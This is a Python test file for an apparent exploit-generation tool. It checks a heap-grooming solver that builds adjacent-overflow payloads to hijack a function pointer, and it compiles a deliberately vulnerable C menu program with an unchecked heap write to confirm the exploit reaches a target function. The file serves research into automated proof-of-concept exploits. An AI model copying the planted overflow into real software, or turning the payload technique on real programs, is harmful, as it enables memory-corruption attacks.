"""Heap grooming solver -> detonated adjacent-overflow function-pointer hijack (doc 58).

The pure solver (offset + payload + lowering) is unit-tested with no toolchain. The end-to-end
detonation builds a non-PIE menu fixture, lowers the groom to input, and CONFIRMS control reaches
win via the INT3 oracle + a negative control -- a real validated heap PoC, 0-false-confirmation.
Building a fixture in dev/benchmark is allowed (the air-gap constraint is on the SHIPPED tool).
"""
import shutil
import struct
import subprocess

import pytest

from lykos.analyze.poc import heap_groom
from lykos.analyze.poc.heap import request2size

_p64 = lambda v: struct.pack("<Q", v)


# ----------------------------------------------------------------- pure solver (no toolchain)
def test_adjacent_overflow_distance_is_the_buffer_chunk_size():
    # malloc(24) -> chunk 0x20; the victim's fp (offset 0) sits exactly one chunk later.
    plan = heap_groom.plan_adjacent_overflow(24, 0x401196)
    assert request2size(24) == 0x20
    assert plan.overflow_distance == 0x20
    assert plan.payload == b"A" * 0x20 + _p64(0x401196)
    assert plan.negative_payload == b"A" * 0x20           # one word short -> no overwrite


def test_adjacent_overflow_respects_fptr_offset():
    plan = heap_groom.plan_adjacent_overflow(40, 0x4011ff, obj_fptr_off=16)
    assert plan.overflow_distance == request2size(40) + 16
    assert plan.payload.endswith(_p64(0x4011ff))
    assert len(plan.payload) == plan.overflow_distance + 8


def test_lowering_emits_alloc_alloc_edit_trigger_in_order():
    plan = heap_groom.plan_adjacent_overflow(24, 0x401196)
    spec = heap_groom.MenuSpec(
        alloc_buf=lambda sz: b"a 0 %d\n" % sz,
        alloc_obj=lambda: b"o 1\n",
        edit_buf=lambda data: b"e 0 %d\n" % len(data) + data,
        trigger=lambda: b"t 1\n",
    )
    stream = heap_groom.lower(plan, spec)
    # alloc buffer, then victim, then the overflow write, then the call -- in that exact order.
    assert stream.startswith(b"a 0 24\no 1\ne 0 40\n")
    assert stream.endswith(b"t 1\n")
    assert b"A" * 0x20 + _p64(0x401196) in stream
    neg = heap_groom.lower(plan, spec, negative=True)
    assert b"e 0 32\n" in neg and _p64(0x401196) not in neg


# ----------------------------------------------------------------- end-to-end detonation
_FIXTURE = r"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void win(void){ _exit(42); }
void benign(void){ }
struct obj { void (*fp)(void); char name[24]; };
void *slots[16];
int main(void){
    char line[128];
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);     /* unbuffered: fgets won't slurp the raw read() payload */
    while (fgets(line, sizeof line, stdin)) {
        int idx=0, size=0, n=0;
        if (line[0]=='a') { sscanf(line, "a %d %d", &idx, &size); slots[idx] = malloc(size); }
        else if (line[0]=='o') { sscanf(line, "o %d", &idx);
            struct obj *ob = malloc(sizeof *ob); ob->fp = benign; slots[idx] = ob; }
        else if (line[0]=='e') { sscanf(line, "e %d %d", &idx, &n);
            if (read(0, slots[idx], n) < 0) return 1; }     /* unchecked length -> heap overflow */
        else if (line[0]=='t') { sscanf(line, "t %d", &idx);
            struct obj *ob = slots[idx]; ob->fp(); }
        else if (line[0]=='q') break;
    }
    return 0;
}
"""


def _win_vaddr(exe):
    out = subprocess.check_output(["nm", str(exe)], text=True)
    for ln in out.splitlines():
        parts = ln.split()
        if len(parts) == 3 and parts[2] == "win":
            return int(parts[0], 16)
    raise AssertionError("win symbol not found")


@pytest.mark.skipif(not shutil.which("gcc") or not shutil.which("nm"),
                    reason="needs gcc + nm to build the fixture")
def test_adjacent_overflow_detonates_to_win(tmp_path):
    src = tmp_path / "heapgroom.c"
    src.write_text(_FIXTURE)
    exe = tmp_path / "heapgroom"
    # Non-PIE (win is a fixed file vaddr), no canary (a heap overflow, not stack -- the canary is
    # irrelevant, but turning it off keeps the fixture minimal and the frame predictable).
    r = subprocess.run(["gcc", "-no-pie", "-fno-stack-protector", "-O0",
                        "-o", str(exe), str(src)], capture_output=True, text=True)
    if r.returncode != 0:
        pytest.skip(f"fixture build failed: {r.stderr[:200]}")

    win = _win_vaddr(exe)
    plan = heap_groom.plan_adjacent_overflow(24, win)        # obj->fp is at offset 0
    spec = heap_groom.MenuSpec(
        alloc_buf=lambda sz: b"a 0 %d\n" % sz,
        alloc_obj=lambda: b"o 1\n",
        edit_buf=lambda data: b"e 0 %d\n" % len(data) + data,
        trigger=lambda: b"t 1\n",
    )
    # The solved groom detonates: control reaches win, and the negative control does NOT.
    assert heap_groom.detonate_adjacent_overflow(str(exe), plan, spec) is True

    # Prove the oracle has teeth: the negative-control stream on its own must not reach win.
    from lykos.analyze.poc import detonate
    neg = heap_groom.lower(plan, spec, negative=True)
    assert detonate.reaches_address(str(exe), neg, win) is False
